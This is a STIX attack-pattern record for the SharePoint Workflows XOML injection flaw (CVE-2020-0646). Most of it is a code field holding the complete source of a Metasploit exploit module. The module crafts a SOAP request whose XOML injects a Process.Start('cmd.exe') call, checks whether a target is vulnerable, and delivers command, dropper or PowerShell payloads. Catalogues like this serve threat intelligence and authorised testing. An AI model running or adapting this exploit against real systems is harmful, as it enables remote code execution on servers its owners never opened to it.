{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5760efc3-c6d9-4027-a948-e0345bf37890",
    "created": "2024-08-14T16:54:03.975774Z",
    "modified": "2024-08-14T16:54:03.975778Z",
    "name": "SharePoint Workflows XOML Injection",
    "description": " This module exploits a vulnerability within SharePoint and its .NET backend that allows an attacker to execute commands using specially crafted XOML data sent to SharePoint via the Workflows functionality. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sharepoint_workflows_xoml.rb",
            "external_id": "sharepoint_workflows_xoml.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-0646"
        },
        {
            "source_name": "reference",
            "url": "https://www.mdsec.co.uk/2020/01/code-injection-in-workflows-leading-to-sharepoint-rce-cve-2020-0646/"
        }
    ],
    "x_code_snippet": "# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SharePoint Workflows XOML Injection',\n        'Description' => %q{\n          This module exploits a vulnerability within SharePoint and its .NET backend\n          that allows an attacker to execute commands using specially crafted XOML data\n          sent to SharePoint via the Workflows functionality.\n        },\n        'Author' => [\n          'Spencer McIntyre',\n          'Soroush Dalili'\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-0646'],\n          ['URL', 'https://www.mdsec.co.uk/2020/01/code-injection-in-workflows-leading-to-sharepoint-rce-cve-2020-0646/']\n        ],\n        'Platform' => 'win',\n        'Targets' => [\n          [ 'Windows EXE Dropper', { 'Arch' => [ARCH_X86, ARCH_X64], 'Type' => :windows_dropper } ],\n          [ 'Windows Command', { 'Arch' => ARCH_CMD, 'Type' => :windows_command, 'Space' => 3000 } ],\n          [\n            'Windows Powershell',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_powershell\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-03-02',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE,],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'Privileged' => true\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The base path to the SharePoint application', '/' ]),\n      OptString.new('DOMAIN', [ true, 'The domain to use for Windows authentication', 'WORKGROUP' ]),\n      OptString.new('USERNAME', [ true, 'Username to authenticate as', '' ]),\n      OptString.new('PASSWORD', [ true, 'The password to authenticate with' ])\n    ])\n  end\n\n  def check\n    res = execute_command(\"echo #{Rex::Text.rand_text_alphanumeric(rand(4..11))}\")\n    return CheckCode::Unknown('Did not receive an HTTP 200 OK response') unless res&.code == 200\n\n    compiler_errors = extract_compiler_errors(res)\n    return CheckCode::Unknown('No compiler errors were reported') unless compiler_errors&.length&.> 0\n\n    # once patched you get a specific compiler error message about the type name\n    return CheckCode::Safe if compiler_errors[0].to_s =~ /is not a valid language-independent type name/\n\n    CheckCode::Vulnerable\n  end\n\n  def extract_compiler_errors(res)\n    return nil unless res&.code == 200\n\n    xml_doc = res.get_xml_document\n    result = xml_doc.search('//*[local-name()=\\'ValidateWorkflowMarkupAndCreateSupportObjectsResult\\']').text\n    return nil if result.empty?\n\n    xml_result = Nokogiri::XML(result)\n    xml_result.xpath('//CompilerError/@Text')\n  end\n\n  def exploit\n    case target['Type']\n    when :windows_command\n      execute_command(payload.encoded)\n    when :windows_dropper\n      cmd_target = targets.select { |target| target['Type'] == :windows_command }.first\n      execute_cmdstager({ linemax: cmd_target.opts['Space'] })\n    when :windows_powershell\n      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))\n    end\n  end\n\n  def escape_command(cmd)\n    # a bunch of characters have to be escaped, so use a whitelist of those that are allowed and escape the rest as unicode\n    cmd.gsub(/([^a-zA-Z0-9 $:;\\-.=\\[\\]{}()])/) { |x| '\\\\u%.4x' % x.unpack('C*')[0] }\n    # rubocop:enable Style/FormatString\n  end\n\n  def execute_command(cmd, _opts = {})\n    xoml_data = <<~EOS\n      <?xml version=\"1.0\" encoding=\"utf-8\"?>\n      <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n        <soap:Body>\n          <ValidateWorkflowMarkupAndCreateSupportObjects xmlns=\"http://microsoft.com/sharepoint/webpartpages\">\n            <workflowMarkupText>\n              <![CDATA[\n                <SequentialWorkflowActivity x:Class=\"MyWorkflow\" x:Name=\"foobar\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/workflow\">\n                  <CallExternalMethodActivity x:Name=\"foo\" MethodName='test1' InterfaceType='System.String);}Object/**/test2=System.Diagnostics.Process.Start(\"cmd.exe\", \"/c #{escape_command(cmd)}\");private/**/void/**/foobar(){//' />\n                </SequentialWorkflowActivity>\n              ]]>\n            </workflowMarkupText>\n            <rulesText></rulesText>\n            <configBlob></configBlob>\n            <flag>2</flag>\n          </ValidateWorkflowMarkupAndCreateSupportObjects>\n        </soap:Body>\n      </soap:Envelope>\n    EOS\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '_vti_bin', 'webpartpages.asmx'),\n      'ctype' => 'text/xml; charset=utf-8',\n      'data' => xoml_data,\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD']\n    })\n\n    unless res&.code == 200\n      print_error('Non-200 HTTP response received while trying to execute the command')\n    end\n\n    res\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-02",
    "x_mitre_platforms": [
        "win'"
    ]
}